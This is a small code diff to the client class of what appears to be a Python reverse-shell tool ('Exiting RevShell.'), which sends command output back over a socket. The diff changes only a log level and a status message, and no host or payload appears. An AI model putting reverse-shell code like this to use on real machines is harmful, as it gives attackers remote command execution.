@@ -80,7 +80,7 @@ class Client(StreamSocket):
 
                     if stdout != b"":
                         output = stdout
-                        level = "info"
+                        level = "output"
                     else:
                         output = stderr
                         level = "error"
@@ -93,7 +93,7 @@ class Client(StreamSocket):
                     self.send(sock, output)
                 else:
                     if self.Verbose:
-                        utils.status(f"Connection been terminated by {self.Address}")
+                        utils.status("stdin => [exit]", "output")
                         utils.status("Exiting RevShell.")
                     break
         except Exception as exc:
